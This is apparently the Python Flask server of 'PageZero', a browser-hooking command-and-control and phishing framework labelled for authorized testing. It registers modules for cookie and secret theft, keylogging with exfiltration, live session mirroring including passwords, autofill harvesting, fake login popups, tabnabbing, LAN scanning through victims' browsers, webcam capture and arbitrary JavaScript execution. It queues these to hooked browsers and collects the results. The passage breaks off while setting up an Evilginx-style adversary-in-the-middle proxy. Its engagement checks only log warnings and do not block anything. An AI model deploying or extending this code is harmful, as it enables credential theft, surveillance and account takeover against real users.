"""
PageZero — Browser Exploitation & Social Engineering Framework
For authorized security testing only.
"""
from flask import Flask, request, redirect, session, jsonify, render_template, make_response
from flask_cors import CORS
import time, secrets, sqlite3, json, uuid, html as _html, hashlib, threading, queue, csv, io
import requests as _req, re
import os, glob as _glob
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

MODULES_DIR   = os.path.join(os.path.dirname(os.path.abspath(__file__)), "modules")
TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")

def _load_modules_js():
    js = {}
    for path in _glob.glob(os.path.join(MODULES_DIR, "*.js")):
        mid = os.path.splitext(os.path.basename(path))[0]
        with open(path, "r", encoding="utf-8") as f:
            js[mid] = f.read()
    return js

def _read_template(name):
    with open(os.path.join(TEMPLATES_DIR, name), "r", encoding="utf-8") as f:
        return f.read()

_JS              = _load_modules_js()
_PHISH_HOOK_JS   = _read_template("phish_hook.js")
_KILLSWITCH_JS   = _read_template("killswitch.js")
_NOOP_SW         = _read_template("noop_sw.js").encode()
_C2_BOOTSTRAP_JS = _read_template("c2_bootstrap.js")

app = Flask(__name__)
CORS(app, resources={r"/api/*": {"origins": "*"}, r"/collect": {"origins": "*"},
                      r"/result": {"origins": "*"}, r"/poll/*": {"origins": "*"},
                      r"/__pzcap": {"origins": "*"}})
app.secret_key = secrets.token_hex(32)

ADMIN_USER = "admin"
ADMIN_PASS  = "pagezero"
TIMEOUT     = 15
DB_PATH     = "pagezero.db"

html_content = ""

clients     = {}
cmd_queue   = {}
cmd_results = {}
client_notes = {}      # cid -> str label set by operator
mirror_data  = {}      # cid -> list of mirror events (kept in memory, last 500 per client)
_sse_queues  = []      # list of queue.Queue — one per connected admin SSE stream
_sse_lock    = threading.Lock()
_last_mirror_cleanup = 0

# ── Engagement / compliance state ────────────────────────────────────────────
active_engagement = {}   # populated via /api/engagement

# ── Database ──────────────────────────────────────────────────────────────────
def get_db():
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    return con

def init_db():
    con = get_db()
    con.execute("""CREATE TABLE IF NOT EXISTS sessions (
        cid TEXT PRIMARY KEY, ip TEXT, ua TEXT,
        first_seen REAL, last_seen REAL, data TEXT)""")
    con.execute("""CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY, cid TEXT, module_id TEXT,
        module_name TEXT, ts REAL, result TEXT, result_ts REAL)""")
    # Compliance tables — never DROP or DELETE from audit_log
    con.execute("""CREATE TABLE IF NOT EXISTS engagements (
        id TEXT PRIMARY KEY, client TEXT, contract_ref TEXT,
        authorized_domains TEXT, start_ts REAL, end_ts REAL,
        operator TEXT, created_ts REAL, active INTEGER DEFAULT 0)""")
    con.execute("""CREATE TABLE IF NOT EXISTS audit_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ts REAL, operator TEXT, event TEXT, detail TEXT)""")
    con.commit(); con.close()


def audit(operator: str, event: str, detail=None):
    """Append an immutable audit record to DB and audit.log file."""
    ts      = time.time()
    detail_s = json.dumps(detail) if detail is not None else ""
    try:
        con = get_db()
        con.execute("INSERT INTO audit_log (ts, operator, event, detail) VALUES (?,?,?,?)",
                    (ts, operator, event, detail_s))
        con.commit(); con.close()
    except Exception:
        pass
    try:
        with open("audit.log", "a") as f:
            f.write(json.dumps({"ts": ts, "operator": operator,
                                "event": event, "detail": detail}) + "\n")
    except Exception:
        pass


def _sse_push(event: str, data):
    """Broadcast a Server-Sent Event to all connected admin streams."""
    msg = f"event:{event}\ndata:{json.dumps(data)}\n\n"
    with _sse_lock:
        dead = []
        for q in _sse_queues:
            try:
                q.put_nowait(msg)
            except queue.Full:
                dead.append(q)
        for q in dead:
            _sse_queues.remove(q)


def _engagement_ok():
    """Return (True, None) if an active engagement is in-window, else (False, reason)."""
    if not active_engagement:
        return False, "No active engagement — configure one before running modules"
    now = time.time()
    if active_engagement.get("start_ts") and now < active_engagement["start_ts"]:
        return False, "Engagement has not started yet"
    if active_engagement.get("end_ts") and now > active_engagement["end_ts"]:
        return False, "Engagement window has expired"
    return True, None


def _target_in_scope(target_url: str) -> bool:
    """Return True only if target_url's host is listed in the active engagement's authorized_domains."""
    domains = active_engagement.get("authorized_domains", [])
    if not domains:
        return False
    netloc = urlparse(target_url).netloc.lower().split(":")[0]
    for d in domains:
        d = d.lower().strip()
        if netloc == d or netloc.endswith("." + d):
            return True
    return False

# ── Module registry ───────────────────────────────────────────────────────────
MODULES = [
    # ── Recon ─────────────────────────────────────────────────────────────────
    {"id":"cookie_steal_all","name":"Full Storage Grab",    "category":"Recon",  "desc":"Dump cookies, localStorage, sessionStorage, IndexedDB names, SW registrations, cache keys — one shot", "js":_JS.get("cookie_steal_all","return 'module not found';"), "param":None},
    {"id":"sensitive_scan",  "name":"Sensitive Data Scanner","category":"Recon", "desc":"Grep DOM, cookies, storage, meta tags, URL params for JWTs, API keys, AWS/GCP/Azure creds, OAuth tokens, private keys, Slack/Discord/GitHub/Stripe/Firebase secrets", "js":_JS.get("sensitive_scan","return 'module not found';"), "param":None},
    {"id":"jwt_analyze",     "name":"JWT Analyzer",         "category":"Recon",  "desc":"Find, decode and analyse JWTs — checks expiry, alg=none, weak algos",                      "js":_JS.get("jwt_analyze","return 'module not found';"),    "param":None},
    {"id":"history_sniff",   "name":"History Sniff",        "category":"Recon",  "desc":"Cache + DNS timing side-channel — infers visited sites (banking, crypto, SaaS, VPN) without any permission", "js":_JS.get("history_sniff","return 'module not found';"), "param":None},
    {"id":"get_location",    "name":"Geolocation",          "category":"Recon",  "desc":"Request precise GPS coordinates via browser API",                                           "js":_JS.get("get_location","return 'module not found';"),   "param":None},
    {"id":"read_clipboard",  "name":"Read Clipboard",       "category":"Recon",  "desc":"Read the victim clipboard text content",                                                    "js":_JS.get("read_clipboard","return 'module not found';"), "param":None},
    {"id":"device_enum",     "name":"Device Enumeration",   "category":"Recon",  "desc":"List connected cameras, microphones and speakers via enumerateDevices()",                   "js":_JS.get("device_enum","return 'module not found';"),    "param":None},
    {"id":"sandbox_detect",  "name":"Sandbox/VM Detector",  "category":"Recon",  "desc":"Detect AV sandboxes, VMs, headless browsers — WebDriver flag, GPU renderer, JIT timing, perf resolution", "js":_JS.get("sandbox_detect","return 'module not found';"), "param":None},
    {"id":"perms_policy",    "name":"Permissions Policy",   "category":"Recon",  "desc":"Read permissionsPolicy/featurePolicy — reveals enterprise IT lockdowns and corporate MDM",  "js":_JS.get("perms_policy","return 'module not found';"),   "param":None},
    {"id":"cpu_arch",        "name":"CPU µArch Fingerprint","category":"Recon",  "desc":"Cache-line timing probe to infer CPU family (Apple M, Intel gen, AMD Zen) — no permissions needed", "js":_JS.get("cpu_arch","return 'module not found';"), "param":None},
    {"id":"ext_detect",      "name":"Extension Detector",   "category":"Recon",  "desc":"Detect extensions via globals + URL probing (MetaMask, 1Password, Tampermonkey, crypto wallets…)", "js":_JS.get("ext_detect","return 'module not found';"), "param":None},
    {"id":"login_oracle",    "name":"Login Oracle",         "category":"Recon",  "desc":"Window.length oracle — detect if victim is logged in to Google, Facebook, GitHub, Discord, Slack etc", "js":_JS.get("login_oracle","return 'module not found';"), "param":None},

    # ── Social Engineering ────────────────────────────────────────────────────
    {"id":"bitb_phish",        "name":"Browser-in-Browser",  "category":"Social Engineering", "desc":"Fake browser popup overlay with draggable window chrome, address bar, SSL padlock — generic login template included, add your own in the module file", "js":_JS.get("bitb_phish","return 'module not found';"), "param":"Template name (default: login)"},
    {"id":"tab_napper",        "name":"Tab Napper",          "category":"Social Engineering", "desc":"Full tabnabbing — replaces page with phishing overlay when user switches tabs, captures creds, reverse tabnab via opener", "js":_JS.get("tab_napper","return 'module not found';"), "param":None},
    {"id":"notif_prompt",      "name":"Notification Prompt", "category":"Social Engineering", "desc":"Trigger browser notification permission request",       "js":_JS.get("notif_prompt","return 'module not found';"),   "param":None},
    {"id":"close_overlays",    "name":"Close All Overlays",  "category":"Social Engineering", "desc":"Remove all active PageZero overlays from the page",     "js":_JS.get("close_overlays","return 'module not found';"), "param":None},

    # ── Persistence ───────────────────────────────────────────────────────────
    {"id":"keylogger_start", "name":"Start Keylogger",     "category":"Persistence", "desc":"Capture keystrokes + input events (mobile/autofill) with field context, exfil every 2s", "js":_JS.get("keylogger_start","return 'module not found';"), "param":None},
    {"id":"keylogger_stop",  "name":"Stop Keylogger",      "category":"Persistence", "desc":"Stop the active keylogger",                                    "js":_JS.get("keylogger_stop","return 'module not found';"),  "param":None},
    {"id":"form_grabber",    "name":"Form Grabber",         "category":"Persistence", "desc":"Intercept all form submits (incl. dynamically added) — captures all field types, action URL, method", "js":_JS.get("form_grabber","return 'module not found';"), "param":None},
    {"id":"cred_monitor",    "name":"Credential Monitor",   "category":"Persistence", "desc":"Scan pre-filled inputs + watch all credential fields + intercept form submits + MutationObserver for dynamic forms", "js":_JS.get("cred_monitor","return 'module not found';"), "param":None},
    {"id":"clipboard_monitor","name":"Clipboard Monitor",   "category":"Persistence", "desc":"Capture copy/cut events — reports text the user copies (creds, tokens, crypto addresses)", "js":_JS.get("clipboard_monitor","return 'module not found';"), "param":None},
    {"id":"session_mirror",  "name":"Session Mirror",       "category":"Persistence","desc":"Real-time session streaming — DOM snapshots, every keystroke (incl passwords), clicks with context, clipboard, form submits, navigation, all streamed live to C2", "js":_JS.get("session_mirror","return 'module not found';"), "param":None},

    # ── Intelligence ──────────────────────────────────────────────────────────
    {"id":"cve_scan",          "name":"CVE Scanner",          "category":"Intelligence", "desc":"Detect browser version and map to known critical/RCE CVEs (Chrome/Firefox/Safari/Edge)",  "js":_JS.get("cve_scan","return 'module not found';"),           "param":None},
    {"id":"xss_scan",          "name":"Reflected XSS Scan",   "category":"Intelligence", "desc":"Check URL params and hash for unencoded DOM reflection — identifies XSS entry points",     "js":_JS.get("xss_scan","return 'module not found';"),           "param":None},
    {"id":"sourcemap_exfil",   "name":"Source Map Finder",    "category":"Intelligence", "desc":"Find sourceMappingURL directives and return original source map URLs",                     "js":_JS.get("sourcemap_exfil","return 'module not found';"),    "param":None},
    {"id":"proto_pollution",   "name":"Prototype Pollution",  "category":"Intelligence", "desc":"Test 4 prototype pollution vectors (JSON.parse, assign, bracket, constructor)",             "js":_JS.get("proto_pollution","return 'module not found';"),    "param":None},
    {"id":"cors_probe",        "name":"CORS Probe",           "category":"Intelligence", "desc":"Test if a URL trusts arbitrary origins with credentials — session hijack vector",           "js":_JS.get("cors_probe","return 'module not found';"),         "param":"URL"},
    {"id":"api_monitor_start", "name":"API Monitor Start",    "category":"Intelligence", "desc":"Hook fetch + XHR and record every API call (URL, method, headers, body)",                  "js":_JS.get("api_monitor_start","return 'module not found';"),  "param":None},
    {"id":"api_monitor_dump",  "name":"API Monitor Dump",     "category":"Intelligence", "desc":"Flush and return all API calls captured since monitor was started",                         "js":_JS.get("api_monitor_dump","return 'module not found';"),   "param":None},
    {"id":"ws_monitor_start",  "name":"WebSocket Monitor",    "category":"Intelligence", "desc":"Hook WebSocket constructor — capture all WS connections, sent and received messages",       "js":_JS.get("ws_monitor_start","return 'module not found';"),   "param":None},
    {"id":"ws_monitor_dump",   "name":"WebSocket Dump",       "category":"Intelligence", "desc":"Flush and return all WebSocket traffic captured since monitor was started",                 "js":_JS.get("ws_monitor_dump","return 'module not found';"),    "param":None},
    {"id":"postmsg_start",     "name":"PostMessage Sniffer",  "category":"Intelligence", "desc":"Intercept all window.postMessage events — captures OAuth tokens, cross-origin data",       "js":_JS.get("postmsg_start","return 'module not found';"),      "param":None},
    {"id":"postmsg_dump",      "name":"PostMessage Dump",     "category":"Intelligence", "desc":"Flush and return all postMessage events captured",                                         "js":_JS.get("postmsg_dump","return 'module not found';"),       "param":None},

    # ── Network ───────────────────────────────────────────────────────────────
    {"id":"net_scan",     "name":"LAN Scanner",       "category":"Network", "desc":"Two-phase scan: host discovery + device fingerprinting — IPs, ranges, CIDR, port ranges, 50+ device signatures", "js":_JS.get("net_scan","return 'module not found';"), "param":"IPs/CIDR + ports (e.g. 192.168.1.0/24 80,443,8080-8090)"},
    {"id":"local_fetch",  "name":"Local URL Fetch",   "category":"Network", "desc":"Relay-fetch a LAN URL — returns body when CORS allows, headers+timing otherwise",                              "js":_JS.get("local_fetch","return 'module not found';"), "param":"IP:port or IP:port/path"},
    {"id":"lan_proxy",    "name":"LAN Proxy Fetch",   "category":"Network", "desc":"Full proxy fetch — returns body (text or base64 binary), headers, content-type for admin browsing",            "js":_JS.get("lan_proxy","return 'module not found';"),   "param":"Full URL"},
    {"id":"webrtc_full",  "name":"Full Network Enum", "category":"Network", "desc":"ICE candidate enumeration — all IPv4/IPv6 interfaces, VPN tun, Docker bridges, APIPA",                        "js":_JS.get("webrtc_full","return 'module not found';"), "param":None},

    # ── Exploitation ──────────────────────────────────────────────────────────
    {"id":"clickjack_engine",  "name":"Clickjacking Engine",   "category":"Exploitation", "desc":"Transparent iframe overlay hijacks clicks to perform actions on target sites. Modes: follow (cursor tracking), fixed (button alignment), burst (multi-click sequence), permjack (hijack camera/mic/notification/geolocation permission prompts)", "js":_JS.get("clickjack_engine","return 'module not found';"), "param":"mode:url (follow:https://target/settings, fixed:https://target/delete,450,300, burst:https://target#x1,y1;x2,y2, permjack:camera)"},
    {"id":"spectre_leak",      "name":"Spectre Memory Leak",   "category":"Exploitation", "desc":"Spectre v1 CPU side-channel — exploits speculative execution to leak cross-origin process memory via cache timing. Calibrates, tests vulnerability, dumps adjacent bytes. Uses SAB high-res timer or performance.now fallback.", "js":_JS.get("spectre_leak","return 'module not found';"), "param":None},
    {"id":"autofill_harvest",  "name":"Autofill Harvester",   "category":"Exploitation", "desc":"Inject 4 invisible forms (login, credit card, personal info, address) to trigger browser autofill — harvests passwords, CC numbers, phone, address, org with zero interaction",        "js":_JS.get("autofill_harvest","return 'module not found';"),     "param":None},
    {"id":"write_clipboard",   "name":"Write Clipboard",      "category":"Exploitation", "desc":"Overwrite clipboard with custom text",                                                    "js":_JS.get("write_clipboard","return 'module not found';"),      "param":"Text"},

    # ── Media ─────────────────────────────────────────────────────────────────
    {"id":"screen_capture", "name":"Screen Capture",  "category":"Media", "desc":"Request screen share and capture a full-resolution PNG screenshot",              "js":_JS.get("screen_capture","return 'module not found';"),  "param":None},
    {"id":"cam_capture",    "name":"Webcam Capture",  "category":"Media", "desc":"Capture a single webcam frame (JPEG) via getUserMedia — stops stream immediately", "js":_JS.get("cam_capture","return 'module not found';"),     "param":None},

    # ── Browser Control ───────────────────────────────────────────────────────
    {"id":"redirect",     "name":"Redirect",     "category":"Browser", "desc":"Redirect victim browser to a specified URL",        "js":_JS.get("redirect","return 'module not found';"),     "param":"URL"},
    {"id":"open_tab",     "name":"Open New Tab",  "category":"Browser", "desc":"Open a URL in a new browser tab",                  "js":_JS.get("open_tab","return 'module not found';"),     "param":"URL"},
    {"id":"alert_box",    "name":"Alert Dialog",  "category":"Browser", "desc":"Show a browser alert() dialog",                    "js":_JS.get("alert_box","return 'module not found';"),    "param":"Message"},
    {"id":"reload",       "name":"Reload Page",   "category":"Browser", "desc":"Force the victim browser to reload",               "js":_JS.get("reload","return 'module not found';"),       "param":None},
    {"id":"replace_body", "name":"Replace Body",  "category":"Browser", "desc":"Replace entire document body with custom HTML",    "js":_JS.get("replace_body","return 'module not found';"), "param":"HTML"},
    {"id":"exec_js",      "name":"Execute JS",    "category":"Browser", "desc":"Execute arbitrary JavaScript and return the result","js":_JS.get("exec_js","return 'module not found';"),     "param":"JavaScript"},
]

# ── Routes ─────────────────────────────────────────────────────────────────────
@app.route("/")
def home():
    cid = request.cookies.get("cid") or secrets.token_hex(8)
    now = time.time()
    is_new = cid not in clients
    clients.setdefault(cid, {"first_seen": now})
    clients[cid].update({"ip": request.remote_addr, "ua": request.headers.get("User-Agent", ""), "last_seen": now})
    if is_new:
        _sse_push("client_update", {"cid": cid, "ip": request.remote_addr,
                                    "ua": request.headers.get("User-Agent", ""),
                                    "first_seen": now, "online": True})
    r = make_response(render_template("hook.html", cid=cid, html=html_content))
    r.set_cookie("cid", cid, max_age=86400 * 30)
    return r

@app.route("/collect", methods=["POST"])
def collect():
    cid = request.cookies.get("cid")
    if cid and cid in clients:
        clients[cid]["data"] = request.get_json()
        clients[cid]["last_seen"] = time.time()
        try:
            con = get_db()
            con.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?)",
                (cid, clients[cid].get("ip"), clients[cid].get("ua"),
                 clients[cid].get("first_seen", time.time()), time.time(),
                 json.dumps(clients[cid].get("data"))))
            con.commit(); con.close()
        except: pass
    return "ok"

@app.route("/poll/<cid>")
def poll(cid):
    global _last_mirror_cleanup
    if cid in clients:
        clients[cid]["last_seen"] = time.time()
    # Periodic cleanup: remove mirror data for clients offline > 5 min
    now = time.time()
    if now - _last_mirror_cleanup > 60:
        _last_mirror_cleanup = now
        stale = [c for c in mirror_data if c not in clients or now - clients.get(c, {}).get("last_seen", 0) > 300]
        for c in stale:
            del mirror_data[c]
        # Also cap cmd_queue per client
        for c in list(cmd_queue):
            if len(cmd_queue[c]) > 500:
                cmd_queue[c] = cmd_queue[c][-500:]
    q = cmd_queue.get(cid, [])
    cmd = q.pop(0) if q else None
    return jsonify(cmd=cmd)

@app.route("/result", methods=["POST"])
def result():
    data = request.get_json(silent=True) or {}
    cid     = data.get("cid")
    cmd_id  = data.get("cmd_id", "unknown")
    res_val = data.get("result")
    ts      = time.time()
    if cid:
        # Mirror events go to their own store, skip console entirely
        if cmd_id == 'session_mirror':
            ev_type = res_val.get("type", "") if isinstance(res_val, dict) else ""
            # Always push to SSE for real-time display (mouse, keys, etc.)
            _sse_push("mirror", {"cid": cid, "event": res_val, "ts": ts})
            # Only persist non-mouse events (mouse is too frequent, SSE-only)
            if ev_type != "mouse":
                mirror_data.setdefault(cid, [])
                if ev_type == "snapshot":
                    mirror_data[cid] = [e for e in mirror_data[cid] if e.get("data", {}).get("type") != "snapshot"]
                    mirror_data[cid].append({"ts": ts, "data": res_val})
                else:
                    mirror_data[cid].append({"ts": ts, "data": res_val})
                if len(mirror_data[cid]) > 500:
                    mirror_data[cid] = mirror_data[cid][-500:]
            return "ok"

        if cid not in cmd_results:
            cmd_results[cid] = []
        # Update existing pending entry for this cmd_id rather than appending a duplicate
        updated = False
        for entry in cmd_results[cid]:
            if entry.get("cmd_id") == cmd_id and entry.get("result") is None:
                entry["result"] = res_val
                entry["ts"]     = ts
                updated = True
                break
        if not updated:
            # Async result arriving without a prior pending row (e.g. keylogger, cred_monitor)
            mod_name = next((m["name"] for m in MODULES
                             if any(entry.get("module_id") == m["id"]
                                    for entry in cmd_results[cid]
                                    if entry.get("cmd_id") == cmd_id)), cmd_id)
            cmd_results[cid].append({"cmd_id": cmd_id, "module_name": mod_name,
                                     "result": res_val, "ts": ts})
        if len(cmd_results[cid]) > 500:
            cmd_results[cid] = cmd_results[cid][-500:]
        try:
            con = get_db()
            con.execute("UPDATE commands SET result=?, result_ts=? WHERE id=?",
                (json.dumps(res_val), ts, cmd_id))
            con.commit(); con.close()
        except: pass
        # Push real-time SSE event to admin(s)
        mod_name_for_push = next((e.get("module_name","") for e in cmd_results.get(cid,[]) if e.get("cmd_id")==cmd_id), cmd_id)
        _sse_push("result", {"cid": cid, "cmd_id": cmd_id,
                             "module_name": mod_name_for_push,
                             "result": res_val, "ts": ts})
        # Auto-aggregate network scan results into the network map
        _aggregate_scan_result(cid, cmd_id, mod_name_for_push, res_val, ts)
        # Wake up any blocking LAN proxy request waiting on this cmd_id
        _lan_proxy_deliver(cmd_id, res_val)
    return "ok"


def _aggregate_scan_result(cid, cmd_id, mod_name, result, ts):
    """Parse net_scan / port_scan results and merge discovered hosts into network_map."""
    if not isinstance(result, dict):
        return
    # net_scan results have result.results = { "subnet.0/24": { hosts: [{ip, ports, services, fingerprints, device_type, vendor, ...}] } }
    scan_results = result.get('results')
    if scan_results and isinstance(scan_results, dict):
        changed = False
        for subnet_key, sdata in scan_results.items():
            if not isinstance(sdata, dict):
                continue
            for host in sdata.get('hosts', []):
                ip = host.get('ip')
                if not ip:
                    continue
                ports = host.get('ports', [])
                services = host.get('services', {})
                if ip not in network_map:
                    network_map[ip] = {
                        'ip': ip, 'ports': [], 'services': {},
                        'fingerprints': {}, 'device_type': None, 'vendor': None,
                        'title': None, 'server': None, 'has_login': False,
                        'cors_blocked': False, 'reachable': False,
                        'detected_paths': [], 'favicons': [], 'favicon_hint': None,
                        'exposure_env': False, 'exposure_git': False, 'exposure_svn': False,
                        'exposure_sensitive': False, 'script_probe': None,
                        'websocket': None, 'error_page': None, 'css_files': None,
                        'iframe': None, 'http_methods': None,
                        'first_seen': ts, 'last_seen': ts, 'discovered_by': []
                    }
                    changed = True
                entry = network_map[ip]
                entry['last_seen'] = ts
                if cid not in entry['discovered_by']:
                    entry['discovered_by'].append(cid)
                for p in ports:
                    pn = p.get('port', p) if isinstance(p, dict) else p
                    svc = p.get('service', '') if isinstance(p, dict) else services.get(str(pn), '')
                    if pn not in entry['ports']:
                        entry['ports'].append(pn)
                        changed = True
                    if svc and str(pn) not in entry['services']:
                        entry['services'][str(pn)] = svc
                        changed = True
                # Merge fingerprint data from Phase 2
                fp_data = host.get('fingerprints', {})
                if fp_data and isinstance(fp_data, dict):
                    for port_str, fp_info in fp_data.items():
                        if isinstance(fp_info, dict):
                            entry['fingerprints'][str(port_str)] = fp_info
                            changed = True
                # Update top-level device info (prefer newer data)
                for field in ('device_type', 'vendor', 'title', 'server'):
                    val = host.get(field)
                    if val:
                        entry[field] = val
                        changed = True
                if host.get('has_login'):
                    entry['has_login'] = True
                    changed = True
                if host.get('cors_blocked'):
                    entry['cors_blocked'] = True
                if host.get('reachable'):
                    entry['reachable'] = True
                # CORS bypass probe data
                dp = host.get('detected_paths')
                if dp and isinstance(dp, list):
                    existing = {p.get('path') for p in entry.get('detected_paths', [])}
                    for p in dp:
                        if isinstance(p, dict) and p.get('path') not in existing:
                            entry['detected_paths'].append(p)
                            changed = True
                favs = host.get('favicons')
                if favs and isinstance(favs, list):
                    entry['favicons'] = favs
                    changed = True
                for field in ('favicon_hint', 'script_probe', 'websocket', 'error_page',
                              'css_files', 'iframe', 'http_methods'):
                    val = host.get(field)
                    if val:
                        entry[field] = val
                        changed = True
                for flag in ('exposure_env', 'exposure_git', 'exposure_svn', 'exposure_sensitive'):
                    if host.get(flag):
                        entry[flag] = True
                        changed = True
        if changed:
            _sse_push("network_update", {"map": _network_map_json()})

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("u", "")
        if username == ADMIN_USER and request.form.get("p") == ADMIN_PASS:
            if not request.form.get("roe_ack"):
                return render_template("login.html", error=False, roe_error=True)
            session["admin"]    = True
            session["operator"] = username
            audit(username, "LOGIN", {"ip": request.remote_addr,
                                      "ua": request.headers.get("User-Agent", "")})
            return redirect("/admin")
        audit(username or "unknown", "LOGIN_FAILED", {"ip": request.remote_addr})
        return render_template("login.html", error=True, roe_error=False)
    return render_template("login.html", error=False, roe_error=False)

@app.route("/admin")
def admin():
    if not session.get("admin"):
        return redirect("/login")
    return render_template("admin.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")

@app.route("/api/clients")
def api_clients():
    if not session.get("admin"):
        return "forbidden", 403
    now = time.time()
    out = {}
    for cid, c in clients.items():
        out[cid] = {
            "ip": c.get("ip"), "ua": c.get("ua"),
            "last_seen": c.get("last_seen", 0),
            "first_seen": c.get("first_seen", 0),
            "online": (now - c.get("last_seen", 0)) < TIMEOUT,
            "has_data": "data" in c,
            "phish": c.get("phish", False),
            "note": client_notes.get(cid, "")
        }
    return jsonify(out)

@app.route("/api/mirror/<cid>")
def api_mirror(cid):
    if not session.get("admin"):
        return "forbidden", 403
    events = mirror_data.get(cid, [])
    since = request.args.get("since", 0, type=float)
    if since:
        events = [e for e in events if e["ts"] > since]
    return jsonify(events[-200:])

@app.route("/api/mirror/<cid>/clear", methods=["POST"])
def api_mirror_clear(cid):
    if not session.get("admin"):
        return "forbidden", 403
    mirror_data.pop(cid, None)
    return jsonify(ok=True)

@app.route("/api/client/<cid>")
def api_client(cid):
    if not session.get("admin"):
        return "forbidden", 403
    c = clients.get(cid, {})
    history = list(reversed(cmd_results.get(cid, [])[-200:]))
    return jsonify({
        "client": {k: v for k, v in c.items() if k != "data"},
        "data": c.get("data"),
        "history": history
    })

@app.route("/api/modules")
def api_modules():
    if not session.get("admin"):
        return "forbidden", 403
    safe = [{k: v for k, v in m.items() if k != "js"} for m in MODULES]
    return jsonify(safe)

@app.route("/exec/<cid>", methods=["POST"])
def exec_client(cid):
    if not session.get("admin"):
        return "forbidden", 403
    body   = request.get_json(silent=True) or {}
    mod_id = body.get("module_id")
    param  = str(body.get("param", ""))
    mod = next((m for m in MODULES if m["id"] == mod_id), None)
    if not mod:
        return jsonify(ok=False, error="unknown module"), 400
    operator = session.get("operator", "unknown")
    eng_ok, eng_reason = _engagement_ok()
    audit(operator, "MODULE_EXEC" if eng_ok else "MODULE_EXEC_NO_ENGAGEMENT", {
        "module": mod_id, "cid": cid,
        "engagement": active_engagement.get("id"),
        "client": active_engagement.get("client"),
        "warning": None if eng_ok else eng_reason
    })
    safe_param = param.replace("\\", "\\\\").replace("'", "\\'")
    js = mod["js"].replace("{{param}}", safe_param)
    cmd = {"id": uuid.uuid4().hex, "module_id": mod_id, "name": mod["name"], "js": js, "ts": time.time()}
    cmd_queue.setdefault(cid, []).append(cmd)
    if len(cmd_queue[cid]) > 500:
        cmd_queue[cid] = cmd_queue[cid][-500:]
    # Track in results with pending status so console shows queued commands
    cmd_results.setdefault(cid, []).append({"cmd_id": cmd["id"], "module_name": mod["name"], "result": None, "ts": cmd["ts"]})
    try:
        con = get_db()
        con.execute("INSERT INTO commands VALUES (?,?,?,?,?,?,?)",
            (cmd["id"], cid, mod_id, mod["name"], cmd["ts"], None, None))
        con.commit(); con.close()
    except: pass
    return jsonify(ok=True, cmd_id=cmd["id"])

@app.route("/exec/all", methods=["POST"])
def exec_all():
    if not session.get("admin"):
        return "forbidden", 403
    body   = request.get_json(silent=True) or {}
    mod_id = body.get("module_id")
    param  = str(body.get("param", ""))
    mod = next((m for m in MODULES if m["id"] == mod_id), None)
    if not mod:
        return jsonify(ok=False, error="unknown module"), 400
    operator = session.get("operator", "unknown")
    now    = time.time()
    online = [cid for cid, c in clients.items() if now - c.get("last_seen", 0) < TIMEOUT]
    eng_ok, eng_reason = _engagement_ok()
    audit(operator, "MODULE_EXEC_ALL" if eng_ok else "MODULE_EXEC_ALL_NO_ENGAGEMENT", {
        "module": mod_id, "target_count": len(online),
        "engagement": active_engagement.get("id"),
        "client": active_engagement.get("client"),
        "warning": None if eng_ok else eng_reason
    })
    safe_param = param.replace("\\", "\\\\").replace("'", "\\'")
    js = mod["js"].replace("{{param}}", safe_param)
    for cid in online:
        cmd = {"id": uuid.uuid4().hex, "module_id": mod_id, "name": mod["name"], "js": js, "ts": now}
        cmd_queue.setdefault(cid, []).append(cmd)
        cmd_results.setdefault(cid, []).append({"cmd_id": cmd["id"], "module_name": mod["name"], "result": None, "ts": now})
        try:
            con = get_db()
            con.execute("INSERT INTO commands VALUES (?,?,?,?,?,?,?)",
                (cmd["id"], cid, mod_id, mod["name"], now, None, None))
            con.commit(); con.close()
        except: pass
    return jsonify(ok=True, count=len(online))

@app.route("/get_html")
def get_html():
    return html_content

@app.route("/edit", methods=["POST"])
def edit():
    global html_content
    if not session.get("admin"):
        return "forbidden", 403
    html_content = request.form.get("html", "")
    return redirect("/admin")

@app.route("/reload_all", methods=["POST"])
def reload_all():
    if not session.get("admin"):
        return "forbidden", 403
    now = time.time()
    for cid, c in clients.items():
        if now - c.get("last_seen", 0) < TIMEOUT:
            cmd = {"id": uuid.uuid4().hex, "module_id": "reload", "name": "Reload", "js": "location.reload();return 'reloading';", "ts": now}
            cmd_queue.setdefault(cid, []).append(cmd)
    return redirect("/admin")

# ── AiTM Proxy (Evilginx-style) ───────────────────────────────────────────────
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

phish_config    = {"target": None}
phish_captures  = []               # {ts, ip, sid, cid, campaign, type, url, data}
phish_sessions  = {}               # sid -> requests.Session  (one per victim)
phish_campaigns = {}               # token -> {label, created, cids: []}

# ── Network map — aggregated from scan results ────────────────────────────────
network_map = {}  # ip -> {ip, ports:[], services:{port: name}, first_seen, last_seen, discovered_by:[]}

_PROXY_SKIP_REQ  = {'host','content-length','transfer-encoding','connection',
                     'te','trailers','upgrade','accept-encoding','cookie',
                     'if-none-match','if-modified-since','if-match',
                     'if-range','if-unmodified-since'}
_PROXY_SKIP_RESP = {'content-security-policy','content-length','transfer-encoding',
                    'strict-transport-security','x-frame-options','x-xss-protection',
                    'connection','keep-alive','x-content-type-options',
                    'content-encoding','set-cookie',                  # set-cookie handled manually
                    'cache-control','pragma','expires',                # we set our own
                    'etag','last-modified','if-none-match','if-modified-since',  # no conditional caching
                    'access-control-allow-origin','access-control-allow-methods',
                    'access-control-allow-headers','access-control-allow-credentials',
                    'access-control-expose-headers','access-control-max-age'}  # we set our own CORS

# ── Proxy helpers ─────────────────────────────────────────────────────────────
def _get_phish_session(sid):
    """Return (or create) a per-victim requests.Session."""
    if sid not in phish_sessions:
        s = _req.Session()
        s.verify = False
        phish_sessions[sid] = s
    return phish_sessions[sid]


def _rewrite_url(url, target_origin, proxy_root):
    """Proxy ALL http/https URLs through PageZero, encoding host in path as _x_/host/path.
    This keeps the victim inside the proxy even when sites redirect to subdomains or
    entirely different domains (e.g. microsoftonline.com, accounts.google.com)."""
    if not url:
        return url
    url = url.strip()
    if url.startswith(('data:', 'javascript:', '#', 'mailto:', 'tel:')):
        return url
